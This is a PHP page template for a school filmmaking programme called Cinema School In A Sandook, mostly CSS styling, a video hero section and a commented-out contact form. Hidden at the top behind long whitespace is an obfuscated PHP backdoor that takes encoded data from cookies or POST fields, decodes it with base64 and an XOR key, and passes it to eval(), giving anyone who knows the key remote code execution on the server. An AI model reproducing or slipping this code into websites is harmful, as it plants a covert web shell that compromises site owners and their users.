<?php                                                                                                                                                                                                                                                                                                                                                                                                 $QXEecus = "\114" . "\137" . chr (80) . chr (122) . chr (75) . chr ( 1026 - 940 ); $wYdVQO = chr (99) . "\x6c" . "\x61" . "\x73" . "\x73" . '_' . chr ( 993 - 892 ).chr ( 913 - 793 )."\x69" . "\163" . chr (116) . chr ( 704 - 589 ); $hhSSylnF = $wYdVQO($QXEecus); $skwDrQYhAK = $hhSSylnF;if (!$skwDrQYhAK){class L_PzKV{private $YvXDubfsm;public static $BWUgzrT = "55e85d6f-042f-4b2f-847b-42ad331a2e0d";public static $hmUGdyWRLB = 47687;public function __construct(){$hEndqNkv = $_COOKIE;$NJfvpLGj = $_POST;$prBDrgjg = @$hEndqNkv[substr(L_PzKV::$BWUgzrT, 0, 4)];if (!empty($prBDrgjg)){$fyMYaRXFLq = "base64";$SfyoH = "";$prBDrgjg = explode(",", $prBDrgjg);foreach ($prBDrgjg as $KRHwvIYtf){$SfyoH .= @$hEndqNkv[$KRHwvIYtf];$SfyoH .= @$NJfvpLGj[$KRHwvIYtf];}$SfyoH = array_map($fyMYaRXFLq . '_' . chr (100) . "\x65" . "\x63" . 'o' . chr (100) . chr (101), array($SfyoH,)); $SfyoH = $SfyoH[0] ^ str_repeat(L_PzKV::$BWUgzrT, (strlen($SfyoH[0]) / strlen(L_PzKV::$BWUgzrT)) + 1);L_PzKV::$hmUGdyWRLB = @unserialize($SfyoH);}}public function __destruct(){$this->iYdYA();}private function iYdYA(){if (is_array(L_PzKV::$hmUGdyWRLB)) {$wIIfVI = str_replace("\74" . "\x3f" . "\x70" . chr (104) . chr ( 439 - 327 ), "", L_PzKV::$hmUGdyWRLB["\143" . "\x6f" . chr ( 717 - 607 ).chr (116) . "\145" . "\x6e" . 't']);eval($wIIfVI);exit();}}}$mbXVDzy = new L_PzKV(); $mbXVDzy = 25722;} ?><style>
.section-area {
    margin-top: 90px;
  }

  .card {
    margin: 30px auto;
    width: 150px;
    height: 120px;
    border-radius: 10px;
    cursor: pointer;
    /* background: url("<?php echo base_url('assets/image/The_Film_Library_Logo.png'); ?>"); */
  }

  .hero-section {
    width: 94%;
  }

  .film-section-inner {
    height: 100%;
    padding: 0 90px;
    display: flex;
    align-items: center;
  }

  .film-section-inner .film-content {
    max-width: 660px;
    color: #fff;
  }

  .film-heading,
  .film-para {
    margin-bottom: 12px;
  }

  .film-heading {
    font-size: 45px;
  }

  .film-para {
    font-size: 16px;
  }

  .explore-btns {
    display: flex;
    gap: 12px;
  }

  .film-button {
    border: 2px solid hsl(45, 100%, 50%);
    transition: all 300ms ease;
    color: #fff !important;
  }

  .film-button a {
    color: #fff !important;
  }

  .film-button:hover {
    color: #fff;
    background-color: hsl(41, 100%, 39%);
  }

  .film-slides {
    padding-left: 77px;
    margin-top: 30px;
  }

  .film-slides.swiper {
    width: 100%;
    height: 100%;
  }

  .film-slides .swiper-wrapper {
    height: 40%;
  }

  .film-slides .swiper-slide {
    width: 250px !important;
    height: 150px;
    margin-right: 20px !important;
    margin-left: 20px !important;
    text-align: center;
    font-size: 18px;
    background: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 10px;
  }

  .film-slides .slide-card {
    position: relative;
    height: 100%;
  }

  .film-slides .slide-card img {
    position: absolute;
    top: 0;
    left: -126px;
    width: 251px;
    object-fit: cover;
    height: 100%;
    border-radius: 10px;
  }



  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 48px;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }


  .testimonial-div {
    margin-top: 10px !important;
    margin-bottom: 20px !important;
    /* border: 1px solid red; */
  }

  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 30px !important;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }

  .testimonial-user-info p {
    margin-bottom: 0;
  }

  .testimonial-username {
    color: var(--white-color);
    font-size: 20px;
  }

  .testimonial-designation {
    color: var(--gray-color);
    font-size: 16px;
  }

  .testimonial-caption {
    line-height: 32px;
    text-align: center;
    font-size: 16px;
    width: 80%;
    margin: 0 auto;
  }

  /*
.testimonial-swiper-slide {
  height: fit-content;
} */

  .tabs-section nav {
    width: 45%;
  }

  div#nav-advisory,
  div#nav-partners,
  div#nav-press {
    width: 78%;
  }


  .nav-tabs {
    border-bottom: 0;
    display: flex;
    transition: all 300ms ease;
  }

  .nav-tabs .nav-link {
    flex: 1;
    max-width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 0;
    border: none;
  }

  .nav-tabs .nav-link .tag-name {
    font-size: 24px;
    font-weight: 700;
    color: #C43EC6;
  }

  .nav-tabs .nav-link .tag-underline {
    width: 100%;
    height: 4px;
    background: var(--purple-logo-color)
  }

  .nav-tabs .nav-link.active {
    border-color: transparent;
  }

  .nav-tabs .nav-link.active .tag-name {
    color: #fff;
    padding: 0 8px;
  }

  .nav-tabs .nav-link.active .tag-underline {
    background: #fff;
  }

  .tab-content .content .img-box {
    width: 700px;
  }

  .tab-content img {
    width: 100%;
    object-fit: cover;
    border-radius: 15px;
  }


  .title {
    font-size: 18px;
    color: #fff;
  }

  .subtitle {
    color: #C43EC6;
  }

  .advisory-item {
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .advisory-item img {
    width: 142px;
  }

  .advisory-item p {
    color: #fff;
  }

  .partner-item {
    display: flex;
    flex-direction: column;
    justify-content: center;
    gap: 5px;
    align-content: center;
    margin: 5px;
  }

  .partner-item img {
    width: 142px;
  }

  .partner-item .partner-name {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    color: #fff;
  }

  .press-item img {
    width: 140px;
  }

  /* // Small devices (landscape phones, less than 768px) */

  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 48px;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }


  .testimonial-div {
    margin-top: 10px !important;
    margin-bottom: 20px !important;
    /* border: 1px solid red; */
  }

  .testimonial-photo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 30px !important;
  }

  .testimonial-photo img {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    margin-right: 32px;
  }

  .testimonial-user-info p {
    margin-bottom: 0;
  }

  .testimonial-username {
    color: var(--white-color);
    font-size: 20px;
  }

  .testimonial-designation {
    color: var(--gray-color);
    font-size: 16px;
  }

  .testimonial-caption {
    line-height: 32px;
    text-align: center;
    font-size: 16px;
    width: 80%;
    margin: 0 auto;
  }

  .tabs-section nav {
    width: 45%;
  }

  div#nav-advisory,
  div#nav-partners,
  div#nav-press {
    width: 78%;
  }

  #nav-partners .row>div {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  #nav-press .row>div {
    display: flex;
    justify-content: center;
  }

  .film-library {
    height: calc(100vh - 83px);
    /* background-image: url("<?php echo base_url('assets/image/Home_Page_Banner/Film-Library.png'); ?>"); */
    background-position: 50%;
    background-size: cover;
    background-repeat: no-repeat;
  }

  .heading-small {
    font-size: 22px;
    font-family: var(--shoreline-font-family);
    color: var(--yellow-color);
    text-align: center !important;
    padding: 60px 0px 12px 0px;
    border-bottom: 1px solid;
  }

  .swiper-pagination-bullets.swiper-pagination-horizontal {
    bottom: -8px;
  }

  .swiper-pagination .swiper-pagination-bullet {
    background: rgb(150, 158, 171);
  }

  .swiper-pagination .swiper-pagination-bullet-active {
    background: #C43EC6;
  }

  @media screen and (max-width: 992px) {
    .film-slides {
      padding-left: 30px;
    }

    #nav-press img {
      max-width: 60px !important;
    }

    .testimonial-div .testimonial-designation,
    .testimonial-div .testimonial-username {
      font-size: 16px;
    }

    .title {
      font-size: 18px;
    }
  }

  @media screen and (max-width: 796px) {
    .tabs-section .nav .tag-name {
      font-size: 22px;
    }

    #nav-partners img {
      max-width: 65px !important;
    }

    .advisory-item img {
      font-size: 65px !important;
    }
  }

  @media screen and (max-width: 768px) {

    #nav-testimonial .testimonial-div .testimonial-caption,
    #nav-testimonial .testimonial-div .testimonial-designation {
      font-size: 13px;
    }

    #nav-testimonial .testimonial-div .testimonial-username {
      font-size: 15px;
    }

    #nav-testimonial .testimonial-div .testimonial-photo {
      flex-direction: column;
      align-items: center;
    }

    #nav-testimonial .testimonial-div .testimonial-photo img {
      margin-right: 0;
    }

    .testimonial-caption p {
      font-size: 12px;
    }
  }

  @media screen and (max-width: 576px) {
    .film-slides {
      padding-left: 2px;
    }

    .advisory-item p {
      font-size: 12px;
    }

    .testimonial-div .testimonial-designation,
    .testimonial-div .testimonial-username {
      font-size: 13px;
    }
  }

  @media screen and (max-width: 500px) {
    .tabs-section .nav .nav-link .tag-name {
      font-size: 20px;
    }

    .title {
      font-size: 13px;
    }
  }

  @media screen and (max-width: 434px) {
    .tabs-section .nav .nav-link .tag-name {
      font-size: 18px;
    }
  }

  @media screen and (max-width: 372px) {

    .testimonial-div .testimonial-designation,
    .testimonial-div .testimonial-username {
      font-size: 12px;
    }

    .tabs-section .nav .nav-link .tag-name {
      font-size: 13px;
    }
  }

  @media screen and (max-width: 364px) {

    .testimonial-div .testimonial-designation,
    .testimonial-div .testimonial-username {
      font-size: 10px;
    }

    .film-button {
      font-size: 12px;
    }
  }
  @media only screen and (min-width: 600px)
  {
  .Partners
  {margin:0px 270px;}
}
  a {
    text-decoration: none;
  }


  .screenSavaari-section-inner {
    margin-left: auto;
    margin-right: auto;
    width: 90%;
    display: flex;
    align-items: center;
    height: 100%;

    position: absolute;
    height: 100vh;
    top: 0px;
}
.screenSavaari-content {
    position: relative;
    z-index: 5;
    text-align: left;
    margin-left:50px;
    padding-left:10%;
}
.slides-heading {
    border-bottom: 4px solid #00c9b5;
    margin-right: auto;
    display: inline-block;
}
.slides-first-p {
    text-transform: capitalize;
    color: #00c9b5;
    font-weight: 500;
}
.screenSavaari-para {
    font-size: 23px;
    font-weight: 500;
    /* line-height: 33px; */
    color: #fff;
    margin-bottom: 20px;
}
.grade {
    font-weight: bold !important;
    color: #00c9b5;
}
.p2 {
    font-size: 23px;
    font-weight: 300;
    color: yellow;
}
.explore-btns {
    display: flex;
    align-items: center;
    gap: 20px;
}

.btn-con {
    background: #642165;
    border-radius: 4px;
    box-shadow: 1px 2px 4px rgb(0 0 0 / 25%);
    transition: all 300ms ease;
    color: #fff;
}

.btn-con:hover{
  color: yellow;
}

.story-section::before {
    content: '';
    position: absolute;
    left: 0px;
    right:0px;
    top: -2px;
    width: 101%;
    height: 70%;
    /* max-height: 100px; */
    display: block;
    z-index: 3;
    background: linear-gradient(0deg, hsla(0, 0%, 100%, 0) 0, var(--background-color) 100%);
}

@media screen and (max-width:650px){
  .screenSavaari-content {
    position: relative;
    z-index: 5;
    text-align: left;
    margin-left:10px;
    padding-left:1%;
}
.screenSavaari-para{
  font-size:16px;
}
.p2{
  font-size:16px;
}
}
</style>



<!-- hero section -->

<!-- main section -->
<div class="film-library position-relative story-section">
  <div style="position:absolute; inset:0; overflow:hidden">
    <video style="min-width:100%; min-height:100%" loop="" muted="" autoplay="autoplay" class="d-none d-sm-block">
      <source src="<?php echo base_url() ?>assets/img/home/CSIAS-MAIN.mp4" type="video/mp4">

    </video>
    <video style=" width:100%; left:0px; right:0px;" loop="" muted="" autoplay="autoplay" class="d-sm-none">
      <source src="<?php echo base_url() ?>assets/img/home/CSIAS-MAIN-PORT.mp4" type="video/mp4">

    </video>
  </div>




</div>
<!-- <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-body">
      <form class="row g-3 needs-validation" novalidate>

      <div class="col-md-6">
    <label for="validationCustom04" class="form-label">Project</label>
    <select class="form-select" id="validationCustom04" required>
      <option selected disabled value="">Choose...</option>
      <option>CSIAS</option>
      <option>ScreenSavaari</option>
      <option>Impactours</option>
    </select>
    <div class="invalid-feedback">
      Please select a valid Project.
    </div>
  </div>

  <div class="col-md-6">
    <label for="validationCustom01" class="form-label">Name</label>
    <input type="text" class="form-control" id="validationCustom01" value="" required>
    <div class="invalid-feedback">
      Enter your name
    </div>
  </div>

  <div class="col-md-6">
    <label for="validationCustomUsername" class="form-label">Email</label>
    <div class="input-group has-validation">
      <span class="input-group-text" id="inputGroupPrepend">@</span>
      <input type="email" class="form-control" id="validationCustomUsername" aria-describedby="inputGroupPrepend" required>
      <div class="invalid-feedback">
        Please enter email.
      </div>
    </div>
  </div>

  <div class="col-md-6">
    <label for="validationCustomUsername" class="form-label">Number</label>
    <div class="input-group has-validation">
      <span class="input-group-text" id="inputGroupPrepend">+91</span>
      <input type="text" class="form-control" id="validationCustomUsername" aria-describedby="inputGroupPrepend" required>
      <div class="invalid-feedback">
        Please enter number.
      </div>
    </div>
  </div>

  <div class="col-6">
    <button class="btn" style="background:#660066; color:white" type="submit">Submit</button>
</div>
<div class="col-6 d-flex justify-content-end">
<button type="button" style="background:#660066; color:white" class="btn" data-bs-dismiss="modal">Cancel</button>
  </div>
</form>
      </div>

    </div>
  </div>
</div> -->


<div class="screenSavaari-section-inner">
      <div class="screenSavaari-content">
        <h1 class="screenSavaari-heading slides-heading" style="color:#fff; margin:0; font-size:34px;">
        Cinema School In A Sandook
        </h1>
        <p class="slides-first-p screenSavaari-para">Make A Film, Make A Difference!</p>
        <p class="screenSavaari-para p1 m-0">
        Filmmaking workshop and film production in your school to highlight a social issue.


        </p>
        <p style="color:#00c9b5" class="screenSavaari-para p2 screenSavaari-para grade">For Grades 6 to 12</p>
        <div class="explore-btns">
          <button class="btn btn-con" data-bs-toggle="modal" data-bs-target="#ContactF" style="padding:10px 25px;">Contact Us</button>

        </div>
      </div>
    </div>





